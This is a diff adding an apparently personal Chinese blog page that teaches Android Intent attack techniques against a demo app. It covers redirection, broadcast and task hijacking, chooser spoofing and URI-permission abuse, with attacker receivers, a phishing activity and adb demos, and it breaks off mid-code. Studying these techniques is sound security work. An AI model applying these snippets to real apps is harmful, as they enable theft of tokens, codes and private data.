@@ -1,0 +1,875 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="bsahfm">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="​	组件之间互相调用与通信，都是通过Intent（意图）来实现的。一个组件可以通过Intent来做不同的事情，可以接收与发送不同的Intent。 Intent也分为两类： 123456789&#x2F;&#x2F; 显式 Intent：明确指定目标Intent intent &#x3D; new Intent();intent.setClassName(&quot;com.target.app&quot;, &quot;com">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intent">
+<meta property="og:url" content="https://yy-t1.github.io/2026/04/30/Intent/index.html">
+<meta property="og:site_name" content="bsahfm">
+<meta property="og:description" content="​	组件之间互相调用与通信，都是通过Intent（意图）来实现的。一个组件可以通过Intent来做不同的事情，可以接收与发送不同的Intent。 Intent也分为两类： 123456789&#x2F;&#x2F; 显式 Intent：明确指定目标Intent intent &#x3D; new Intent();intent.setClassName(&quot;com.target.app&quot;, &quot;com">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yy-t1.github.io/2026/04/30/Intent/image-20260502200243809.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/04/30/Intent/image-20260502200418757.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/04/30/Intent/image-20260502200620246.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/04/30/Intent/image-20260502200633293.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/04/30/Intent/image-20260502200717038.png">
+<meta property="article:published_time" content="2026-04-30T09:16:32.000Z">
+<meta property="article:modified_time" content="2026-05-02T12:11:20.003Z">
+<meta property="article:author" content="bsahfm">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yy-t1.github.io/2026/04/30/Intent/image-20260502200243809.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Intent - bsahfm</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yy-t1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"A72cL0RlIkmsXlCGMx51Qi51-gzGzoHsz","app_key":"xxsSPn2ge0tYPU7nwv5Gyd1r","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>tyy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Intent"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-30 17:16" pubdate>
+          2026年4月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Intent</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>​	组件之间互相调用与通信，都是通过Intent（意图）来实现的。一个组件可以通过Intent来做不同的事情，可以接收与发送不同的Intent。</p>
+<p>Intent也分为两类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 显式 Intent：明确指定目标</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>intent.setClassName(<span class="hljs-string">&quot;com.target.app&quot;</span>, <span class="hljs-string">&quot;com.target.app.PaymentActivity&quot;</span>);<br>startActivity(intent);<br><br><span class="hljs-comment">// 隐式 Intent：描述动作，系统匹配</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.intent.action.VIEW&quot;</span>);<br>intent.setData(Uri.parse(<span class="hljs-string">&quot;https://example.com&quot;</span>));<br>startActivity(intent);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>Intent数据承载：</p>
+<table>
+<thead>
+<tr>
+<th align="left">字段</th>
+<th align="left">说明</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">action</td>
+<td align="left">动作标识符</td>
+<td align="left"><code>android.intent.action.VIEW</code></td>
+</tr>
+<tr>
+<td align="left">data</td>
+<td align="left">URI 数据</td>
+<td align="left"><code>content://contacts/1</code></td>
+</tr>
+<tr>
+<td align="left">type</td>
+<td align="left">MIME 类型</td>
+<td align="left"><code>image/png</code></td>
+</tr>
+<tr>
+<td align="left">category</td>
+<td align="left">类别标签</td>
+<td align="left"><code>android.intent.category.DEFAULT</code></td>
+</tr>
+<tr>
+<td align="left">extras</td>
+<td align="left">键值对附加数据</td>
+<td align="left"><code>putExtra(&quot;url&quot;, &quot;https://evil.com&quot;)</code></td>
+</tr>
+<tr>
+<td align="left">flags</td>
+<td align="left">控制标志位</td>
+<td align="left"><code>FLAG_GRANT_READ_URI_PERMISSION</code></td>
+</tr>
+<tr>
+<td align="left">component</td>
+<td align="left">目标组件</td>
+<td align="left"><code>com.app/.Activity</code></td>
+</tr>
+</tbody></table>
+<p>（extras可以携带任意类型的数据，包括另一个Intent）</p>
+<p><code>ps：APP A（Intent发出）–&gt;ActivityManagerService–&gt;APP B–&gt;执行</code></p>
+<h2 id="Intent重定向"><a href="#Intent重定向" class="headerlink" title="Intent重定向"></a>Intent重定向</h2><p>用一个可导出组件，帮外部调用一个本不该被外部访问的内部组件。</p>
+<p>（因为传入Intent时，APP会替该Intent去执行操作，所以相当于APP去帮我们执行，自然也不会受到权限限制）</p>
+<h3 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h3><p><strong>直接转发嵌套 Intent</strong></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">Intent <span class="hljs-keyword">next</span> = getIntent().getParcelableExtra(<span class="hljs-string">&quot;next_intent&quot;</span>)<span class="hljs-comment">;</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">next</span> != <span class="hljs-literal">null</span>) &#123;<br>    startActivity(<span class="hljs-keyword">next</span>)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接传Intent且直接调用 <code>startActivity</code>不做任何效验</p>
+<p><strong>字符串参数构造Intent</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">pkg</span> <span class="hljs-operator">=</span> getIntent().getStringExtra(<span class="hljs-string">&quot;target_package&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> getIntent().getStringExtra(<span class="hljs-string">&quot;target_class&quot;</span>);<br><br><span class="hljs-type">Intent</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>i.setClassName(pkg, cls);<br>startActivity(i);<br></code></pre></td></tr></table></figure>
+
+<p>不直接传Intent，而是传入包名和类名，APP自己拼接成Intent</p>
+<p>adb演示：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -n com<span class="hljs-selector-class">.demo</span>.intentsecurity/<span class="hljs-selector-class">.VulnProxyActivity</span> \<br>    <span class="hljs-attr">--es</span> target_package <span class="hljs-string">&quot;com.demo.intentsecurity&quot;</span> \<br>    <span class="hljs-attr">--es</span> target_class <span class="hljs-string">&quot;com.demo.intentsecurity.InternalTokenActivity&quot;</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2026/04/30/Intent/image-20260502200243809.png" srcset="/img/loading.gif" lazyload class="" title="image-20260502200243809">
+
+<p><strong>IntentSender &#x2F; PendingIntent 中继</strong></p>
+<p>PendingIntent：APP未来替别人执行一次操作</p>
+<p>IntentSender 其实就是PendingIntent的底层执行语句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">IntentSender</span> <span class="hljs-variable">sender</span> <span class="hljs-operator">=</span><br>        intent.getParcelableExtra(<span class="hljs-string">&quot;intent_sender&quot;</span>);<br><br><span class="hljs-keyword">if</span> (sender != <span class="hljs-literal">null</span>) &#123;<br>    sender.sendIntent(<br>        context,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">null</span>,<br>        <span class="hljs-literal">null</span>,<br>        <span class="hljs-literal">null</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><h4 id="Android-12"><a href="#Android-12" class="headerlink" title="Android 12+"></a>Android 12+</h4><p>Intent从另一个Intent的extras取出时，如果目标组件未导出就会抛出异常</p>
+<p>（只对startActivity 有效，对sendBroadcast 和 startService 的限制较弱）</p>
+<h2 id="隐式Intent信息泄露"><a href="#隐式Intent信息泄露" class="headerlink" title="隐式Intent信息泄露"></a>隐式Intent信息泄露</h2><p>APP使用隐式Intent发送数据，系统会在已经安装的APP进行匹配，如果恶意APP注册了相应的Intent-filter，就能截获这个Intent携带数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 受害 App 发送隐式 Intent</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;com.victim.app.ACTION_SHARE_TOKEN&quot;</span>);<br>intent.putExtra(<span class="hljs-string">&quot;auth_token&quot;</span>, <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiJ9...&quot;</span>);<br>sendBroadcast(intent);  <span class="hljs-comment">// 任何注册了这个 action 的 App 都能收到</span><br><br><br>&lt;!-- 攻击者 App 的 Manifest --&gt;<br>&lt;receiver android:name=<span class="hljs-string">&quot;.TokenStealer&quot;</span> android:exported=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>    &lt;intent-filter&gt;<br>        &lt;action android:name=<span class="hljs-string">&quot;com.victim.app.ACTION_SHARE_TOKEN&quot;</span> /&gt;<br>    &lt;/intent-filter&gt;<br>&lt;/receiver&gt;<br></code></pre></td></tr></table></figure>
+
+<p>不至于广播（sendBroadcast），其他组件也可以，类似于Activity。</p>
+<p>adb演示：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.demo.intentsecurity/.LeakySenderActivity<br></code></pre></td></tr></table></figure>
+
+<img src="/2026/04/30/Intent/image-20260502200418757.png" srcset="/img/loading.gif" lazyload class="" title="image-20260502200418757">
+
+<h2 id="有序广播劫持"><a href="#有序广播劫持" class="headerlink" title="有序广播劫持"></a>有序广播劫持</h2><p>有序广播（Ordered Broadcast）是一种按优先级依次分发的广播。接收者可以修改广播内容，甚至终止广播的继续传递。</p>
+<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-comment">// 受害 App 发送有序广播</span><br>sendOrderedBroadcast(intent, <span class="hljs-literal">null</span>);<br><br>攻击者注册一个高优先级的 <span class="hljs-type">Receiver</span>：<br>&lt;receiver android:name=<span class="hljs-string">&quot;.Hijacker&quot;</span> android:exported=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>    &lt;intent-filter android:priority=<span class="hljs-string">&quot;999&quot;</span>&gt;<br>        &lt;action android:name=<span class="hljs-string">&quot;com.victim.app.ACTION_VERIFY&quot;</span> /&gt;<br>    &lt;/intent-filter&gt;<br>&lt;/receiver&gt;<br><br><br><span class="hljs-comment">// 攻击者的 Receiver</span><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hijacker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BroadcastReceiver</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    public void onReceive(<span class="hljs-type">Context</span> context, <span class="hljs-type">Intent</span> intent) &#123;<br>        <span class="hljs-comment">// 窃取数据</span><br>        <span class="hljs-type">String</span> code = intent.getStringExtra(<span class="hljs-string">&quot;verification_code&quot;</span>);<br>        <span class="hljs-type">Log</span>.d(<span class="hljs-string">&quot;Hijacker&quot;</span>, <span class="hljs-string">&quot;Got code: &quot;</span> + code);<br><br>        <span class="hljs-comment">// 终止广播，后续合法 Receiver 收不到</span><br>        abortBroadcast();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>优先级： -1000 到 1000，越大越先接收</p>
+<h2 id="Activity选择器劫持"><a href="#Activity选择器劫持" class="headerlink" title="Activity选择器劫持"></a>Activity选择器劫持</h2><p>当隐式 Intent 匹配到多个 Activity 时，系统弹出选择器（Chooser）。攻击者可以注册一个看起来像合法应用的 Activity 来欺骗用户选择：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!-- 攻击者 App 伪装成文件管理器 --&gt;<br>&lt;activity<br>    android:name=<span class="hljs-string">&quot;.FakeFileManager&quot;</span><br>    android:label=<span class="hljs-string">&quot;文件管理器&quot;</span><br>    android:exported=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>    &lt;intent-filter&gt;<br>        &lt;action android:name=<span class="hljs-string">&quot;android.intent.action.GET_CONTENT&quot;</span> /&gt;<br>        &lt;category android:name=<span class="hljs-string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;<br>        &lt;data android:mimeType=<span class="hljs-string">&quot;*/*&quot;</span> /&gt;<br>    &lt;/intent-filter&gt;<br>&lt;/activity&gt;<br></code></pre></td></tr></table></figure>
+
+<p>一旦用户点击，攻击者的Activity就劫持了相应的数据</p>
+<h2 id="Intent-Flag滥用"><a href="#Intent-Flag滥用" class="headerlink" title="Intent Flag滥用"></a>Intent Flag滥用</h2><h3 id="FLAG-GRANT-READ-URI-PERMISSION"><a href="#FLAG-GRANT-READ-URI-PERMISSION" class="headerlink" title="FLAG_GRANT_READ_URI_PERMISSION"></a>FLAG_GRANT_READ_URI_PERMISSION</h3><p>临时把某个 content:&#x2F;&#x2F; URI 的读取权限授权给别的 App。</p>
+<p>（合法共享文件）</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs fortran">别的app：<br>Uri uri = Uri.parse(<br>    <span class="hljs-string">&quot;content://com.demo.provider/private/file.pdf&quot;</span><br>);<br>getContentResolver().openInputStream(uri)<br>通常会没权限<br><br><br>FLAG_GRANT_READ_URI_PERMISSION：<br><span class="hljs-keyword">Intent</span> <span class="hljs-keyword">intent</span> = new <span class="hljs-keyword">Intent</span>(<span class="hljs-keyword">Intent</span>.ACTION_SEND);<br><span class="hljs-keyword">intent</span>.setType(<span class="hljs-string">&quot;image/*&quot;</span>);<br><span class="hljs-keyword">intent</span>.putExtra(<span class="hljs-keyword">Intent</span>.EXTRA_STREAM, uri);<br><span class="hljs-keyword">intent</span>.addFlags(<br>    <span class="hljs-keyword">Intent</span>.FLAG_GRANT_READ_URI_PERMISSION<br>);<br>startActivity(<span class="hljs-keyword">intent</span>);<br>可以正常获得权限<br></code></pre></td></tr></table></figure>
+
+
+
+<p>当受害APP导出组件存在重定向漏洞时，攻击则可以构造带有<code>FLAG_GRANT_READ_URI_PERMISSION</code>的Intent，让受害APP把自己的ContentProvider的数据授权给攻击者</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 攻击者构造的 Intent</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>inner.setData(Uri.parse(<span class="hljs-string">&quot;content://com.victim.app.provider/private_data&quot;</span>));<br>inner.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);<br>inner.setClassName(<span class="hljs-string">&quot;com.attacker.app&quot;</span>, <span class="hljs-string">&quot;com.attacker.app.ReceiverActivity&quot;</span>);<br><br><span class="hljs-comment">// 通过 Intent 重定向漏洞让受害 App 执行</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>outer.setClassName(<span class="hljs-string">&quot;com.victim.app&quot;</span>, <span class="hljs-string">&quot;com.victim.app.VulnRedirectActivity&quot;</span>);<br>outer.putExtra(<span class="hljs-string">&quot;next_intent&quot;</span>, inner);<br>startActivity(outer);<br></code></pre></td></tr></table></figure>
+
+<h3 id="FLAG-ACTIVITY-NEW-TASK-与任务栈劫持"><a href="#FLAG-ACTIVITY-NEW-TASK-与任务栈劫持" class="headerlink" title="FLAG_ACTIVITY_NEW_TASK 与任务栈劫持"></a>FLAG_ACTIVITY_NEW_TASK 与任务栈劫持</h3><p>Android 的 Activity 是按”任务栈”（Task）组织的。每个任务栈是一组 Activity 的堆叠，用户按返回键时从栈顶依次弹出。</p>
+<p><code>FLAG_ACTIVITY_NEW_TASK</code>：让目标 Activity 在一个新的任务栈中启动。</p>
+<p><code>taskAffinity</code>：决定 Activity 属于哪个任务栈</p>
+<p>攻击者通过特定设置，可以将自己的Activity插入到受害者APP的任务栈：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 攻击者 App 的 Activity，设置与受害 App 相同的 taskAffinity --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhishingActivity&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:taskAffinity</span>=<span class="hljs-string">&quot;com.victim.app&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br><br><br>// 攻击者启动自己的 Activity 到受害 App 的任务栈<br>Intent intent = new Intent(this, PhishingActivity.class);<br>intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>startActivity(intent);<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Intent-Scheme-URL（Intent-协议链接）"><a href="#Intent-Scheme-URL（Intent-协议链接）" class="headerlink" title="Intent Scheme URL（Intent 协议链接）"></a>Intent Scheme URL（Intent 协议链接）</h2><p>本质：用一个URL，直接描述一个Intent再通过<code>Intent.parseUri(...)</code>将URL变成真正的Intent去执行</p>
+<p>所以其中如果没有合理的过滤，那就可以通过这个URL触发任意Intent。</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">Intent</span> URL:<br><span class="hljs-keyword">intent</span>://host#<span class="hljs-keyword">Intent</span>;<br>scheme=myapp;<br>component=com.victim.app/.InternalActivity;<br><span class="hljs-keyword">end</span><br>表示<br><br><br>// 将 <span class="hljs-keyword">intent</span>:// URL 解析为 <span class="hljs-keyword">Intent</span> 对象<br><span class="hljs-keyword">Intent</span> <span class="hljs-keyword">intent</span> = <span class="hljs-keyword">Intent</span>.parseUri(url, <span class="hljs-keyword">Intent</span>.URI_INTENT_SCHEME);<br>startActivity(<span class="hljs-keyword">intent</span>);<br></code></pre></td></tr></table></figure>
+
+<p>类似于</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// WebView 中拦截 URL 加载</span><br>@Override<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span>ean shouldOverrideUrlLoading(WebView view, String url) &#123;<br>    <span class="hljs-keyword">if</span> (url.startsWith(<span class="hljs-string">&quot;intent://&quot;</span>)) &#123;<br>        Intent <span class="hljs-built_in">int</span>ent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);<br>        startActivity(<span class="hljs-built_in">int</span>ent);  <span class="hljs-comment">// 危险：直接执行从 URL 解析出的 Intent</span><br>        <span 